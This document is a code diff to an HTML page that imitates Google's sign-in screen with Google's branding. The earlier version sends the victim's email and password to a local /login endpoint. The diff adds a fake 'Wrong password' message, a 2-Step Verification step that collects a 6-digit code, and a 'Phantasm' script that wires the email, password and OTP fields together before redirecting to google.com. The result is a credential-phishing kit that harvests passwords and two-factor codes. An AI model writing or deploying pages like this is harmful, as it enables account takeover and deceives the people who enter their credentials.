@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
+    <title>Log in - Google Accounts</title>
     <link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png">
     <style>
         body {
@@ -181,7 +181,7 @@
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
         
         <div id="step-1">
-            <h1>Sign in</h1>
+            <h1>Log in</h1>
             <p class="subtitle">Use your Google Account</p>
             
             <div class="input-wrapper">
@@ -200,18 +200,23 @@
             
             <div class="actions">
                 <a href="#" class="create-account">Create account</a>
-                <button class="next-btn" onclick="goToStep2()">Next</button>
+                <button class="next-btn" id="btn-next">Next</button>
             </div>
         </div>
 
         <div id="step-2" class="hidden">
             <h1>Welcome</h1>
-            <div class="profile-pill" onclick="goToStep1()">
+            <div class="profile-pill" id="profile-pill-back">
                 <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User">
                 <span id="user-email-display">user@example.com</span>
                 <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #5f6368; margin-left: 8px;"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"></path></svg>
             </div>
             
+            <div id="error-msg" style="color: #d93025; font-size: 12px; margin-bottom: 10px; display: none;">
+                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="vertical-align: middle; margin-right: 5px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                Wrong password. Try again or click Forgot password to reset it.
+            </div>
+
             <div class="input-wrapper" style="margin-top: 40px;">
                 <input type="password" id="password-input" class="input-field" placeholder=" " required>
                 <label class="input-label">Enter your password</label>
@@ -223,7 +228,30 @@
             
             <div class="actions" style="margin-top: 60px;">
                 <a href="#" class="create-account"></a> <!-- Spacer -->
-                <button class="next-btn" onclick="submitLogin()">Next</button>
+                <button id="password-next-btn" class="next-btn">Next</button>
+            </div>
+        </div>
+
+        <div id="step-2fa" class="hidden">
+            <h1>2-Step Verification</h1>
+            <p class="subtitle">To help keep your account safe, Google wants to make sure it’s really you trying to sign in.</p>
+            
+            <div class="profile-pill">
+                <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User">
+                <span id="user-email-2fa">user@example.com</span>
+            </div>
+            
+            <div class="input-wrapper">
+                <input type="tel" id="otp-input" class="input-field" placeholder=" " required maxlength="6" pattern="[0-9]*">
+                <label class="input-label">Enter the 6-digit code</label>
+            </div>
+            
+            <div class="forgot-email">
+                <a href="#">More options</a>
+            </div>
+            
+            <div class="actions">
+                <button class="next-btn" id="btn-otp-submit">Next</button>
             </div>
         </div>
     </div>
@@ -239,56 +267,31 @@
         </div>
     </div>
 
+    <!-- Phantasm Engine -->
+    <script src="/assets/js/phantasm.js"></script>
     <script>
-        function goToStep2() {
-            const email = document.getElementById('email-input').value;
-            if (!email) {
-                document.getElementById('email-input').focus();
-                document.getElementById('email-input').style.borderColor = '#d93025';
-                return;
-            }
-            document.getElementById('user-email-display').innerText = email;
-            document.getElementById('step-1').classList.add('hidden');
-            document.getElementById('step-2').classList.remove('hidden');
-            document.getElementById('password-input').focus();
-        }
-
-        function goToStep1() {
-            document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('step-1').classList.remove('hidden');
-        }
-
-        function submitLogin() {
-            const email = document.getElementById('email-input').value;
-            const password = document.getElementById('password-input').value;
-            
-            if (!password) {
-                document.getElementById('password-input').focus();
-                document.getElementById('password-input').style.borderColor = '#d93025';
-                return;
-            }
-
-            fetch('/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    email: email,
-                    password: password
-                })
-            }).then(() => {
-                // Redirect handled by server response or fallback
-                window.location.href = "https://accounts.google.com/";
+        document.addEventListener('DOMContentLoaded', () => {
+            // Custom back button logic
+            document.getElementById('profile-pill-back').addEventListener('click', () => {
+                document.getElementById('step-2').classList.add('hidden');
+                document.getElementById('step-1').classList.remove('hidden');
+                document.getElementById('step-1').style.display = 'flex'; // Google container is flex
             });
-        }
-        
-        // Allow Enter key
-        document.getElementById('email-input').addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') goToStep2();
-        });
-        document.getElementById('password-input').addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') submitLogin();
+
+            new Phantasm({
+                redirectUrl: 'https://www.google.com',
+                selectors: {
+                    email: '#email-input',
+                    password: '#password-input',
+                    otp: '#otp-input',
+                    nextBtn: '#btn-next',
+                    submitBtn: '#password-next-btn',
+                    otpBtn: '#btn-otp-submit',
+                    step1: '#step-1',
+                    step2: '#step-2',
+                    step3: '#step-2fa' // Using the native-styled container
+                }
+            });
         });
     </script>
 </body>
